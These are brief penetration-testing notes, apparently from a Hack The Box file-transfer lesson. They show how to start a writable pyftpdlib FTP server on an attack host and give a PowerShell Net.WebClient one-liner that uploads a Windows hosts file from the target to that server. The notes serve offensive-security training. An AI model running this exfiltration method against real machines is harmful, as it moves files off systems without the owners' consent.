we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

```
sudo python3 -m pyftpdlib --port 21 --write
```

setup
```
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell Upload File
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

